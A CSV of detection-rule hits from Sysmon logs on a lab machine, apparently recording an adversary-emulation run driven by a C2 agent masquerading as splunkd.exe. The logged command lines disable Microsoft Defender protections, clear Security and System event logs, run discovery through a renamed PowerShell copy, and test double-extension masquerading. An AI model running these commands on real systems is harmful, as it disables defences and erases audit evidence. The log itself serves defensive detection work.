"Timestamp","RuleTitle","Level","Computer","Channel","EventID","MitreTactics","MitreTags","OtherTags","RecordID","Details","ExtraFieldInfo","RuleFile","RuleID","EvtxFile"
"2025-12-23 14:06:17.380 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172633,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Set-MpPreference -DisableIntrusionPreventionSystem $true;Set-MpPreference -DisableIOAVProtection $true;Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableScriptScanning $true;Set-MpPreference -EnableControlledFolderAccess Disabled;"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 2380 ¦ PGUID: E9F06A57-93C9-694A-AD02-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:06:17.370","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:52.437 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172637,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4400 ¦ PGUID: E9F06A57-9428-694A-B302-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:52.428","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:52.796 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172640,"Cmdline: ""C:\Windows\Temp\debug.exe"" get-process ¦ Proc: C:\Windows\Temp\debug.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8840 ¦ PGUID: E9F06A57-9428-694A-B402-000000002300 ¦ ParentPID: 4400 ¦ ParentPGUID: E9F06A57-9428-694A-B302-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:52.792","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:53.276 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172642,"Cmdline: ""C:\Windows\Temp\debug.exe"" get-localgroup ¦ Proc: C:\Windows\Temp\debug.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8540 ¦ PGUID: E9F06A57-9429-694A-B502-000000002300 ¦ ParentPID: 4400 ¦ ParentPGUID: E9F06A57-9428-694A-B302-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:53.275","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:53.625 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172644,"Cmdline: ""C:\Windows\Temp\debug.exe"" get-localuser ¦ Proc: C:\Windows\Temp\debug.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 5320 ¦ PGUID: E9F06A57-9429-694A-B602-000000002300 ¦ ParentPID: 4400 ¦ ParentPGUID: E9F06A57-9428-694A-B302-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:53.624","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:07:53.905 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172646,"Cmdline: ""C:\Windows\Temp\debug.exe"" Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion ¦ Proc: C:\Windows\Temp\debug.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Temp\debug.exe;C:\Windows\Temp\debug.exe get-process >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localgroup >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe get-localuser >> C:\Windows\temp\debug.log;C:\Windows\Temp\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion >> C:\Windows\temp\debug.log;"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 5248 ¦ PGUID: E9F06A57-9429-694A-B702-000000002300 ¦ ParentPID: 4400 ¦ ParentPGUID: E9F06A57-9428-694A-B302-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:07:53.904","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:08:56.533 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172649,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Clear-Eventlog Security;Clear-Eventlog System;"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8508 ¦ PGUID: E9F06A57-9468-694A-B902-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:08:56.521","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:11:33.616 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172660,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4932 ¦ PGUID: E9F06A57-9505-694A-C302-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:11:33.610","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:41.969 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172683,"Cmdline: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.doc.ps1 ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 540 ¦ PGUID: E9F06A57-9549-694A-CF02-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:41.966","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:42.205 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172685,"Cmdline: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.pdf.ps1 ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 484 ¦ PGUID: E9F06A57-954A-694A-D002-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:42.204","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:12:42.421 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172687,"Cmdline: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File C:\Users\student\AppData\Local\Temp\T1036.007_masquerading.rtf.ps1 ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: cmd.exe /C copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.docx.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.pdf.exe /Y && copy ""C:\Windows\System32\calc.exe"" %temp%\T1036.007_masquerading.ps1.exe /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xls.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.xlsx.vbs /Y && copy ""4bd145_T1036.007_masquerading.vbs"" %temp%\T1036.007_masquerading.png.vbs /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.doc.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.pdf.ps1 /Y && copy ""107417_T1036.007_masquerading.ps1"" %temp%\T1036.007_masquerading.rtf.ps1 /Y && %temp%\T1036.007_masquerading.docx.exe && %temp%\T1036.007_masquerading.pdf.exe && %temp%\T1036.007_masquerading.ps1.exe && %temp%\T1036.007_masquerading.xls.vbs && %temp%\T1036.007_masquerading.xlsx.vbs && %temp%\T1036.007_masquerading.png.vbs && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1 && C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1 ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8344 ¦ PGUID: E9F06A57-954A-694A-D102-000000002300 ¦ ParentPID: 8516 ¦ ParentPGUID: E9F06A57-9545-694A-C402-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\Windows\System32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Windows\System32\cmd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:12:42.420","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:13:20.664 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172689,"Cmdline: powershell.exe -ExecutionPolicy Bypass -C ""Start-Process powershell.exe -WindowStyle hidden calc.exe"" ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: ""C:\Users\Public\splunkd.exe"" -server http://192.168.201.129:8888 -group red ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 4192 ¦ PGUID: E9F06A57-9570-694A-D202-000000002300 ¦ ParentPID: 2972 ¦ ParentPGUID: E9F06A57-8EA3-694A-5C02-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ ParentImage: C:\Users\Public\splunkd.exe ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:13:20.656","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_defense.evtx"
"2025-12-23 14:13:20.924 +01:00","Non Interactive PowerShell Process Spawned","low","DESKTOP-G2OBL3D","Sysmon",1,"Exec","T1059.001","sysmon",172691,"Cmdline: ""C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe"" calc.exe ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ User: DESKTOP-G2OBL3D\student ¦ ParentCmdline: powershell.exe -ExecutionPolicy Bypass -C ""Start-Process powershell.exe -WindowStyle hidden calc.exe"" ¦ LID: 0x18b20 ¦ LGUID: E9F06A57-7C75-694A-208B-010000000000 ¦ PID: 8360 ¦ PGUID: E9F06A57-9570-694A-D302-000000002300 ¦ ParentPID: 4192 ¦ ParentPGUID: E9F06A57-9570-694A-D202-000000002300 ¦ Description: Windows PowerShell ¦ Product: Microsoft® Windows® Operating System ¦ Company: Microsoft Corporation ¦ Hashes: MD5=909A2EEC5534F01DFF87B7D47E57BFF7,SHA256=D3B4B97C2BF97D70E5655FF4C4CA1D8CEF9DED51685CFD764247CFDA98EE68DF,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77","CurrentDirectory: C:\WINDOWS\system32\ ¦ FileVersion: 10.0.26100.1 (WinBuild.160101.0800) ¦ IntegrityLevel: High ¦ OriginalFileName: PowerShell.EXE ¦ RuleName: - ¦ TerminalSessionId: 1 ¦ UtcTime: 2025-12-23 13:13:20.923","proc_creation_win_powershell_non_interactive_execution.yml","7b9c1012-0114-7467-278f-9c073249b3b7","C:\Tools\Logs\mc_defense.evtx"
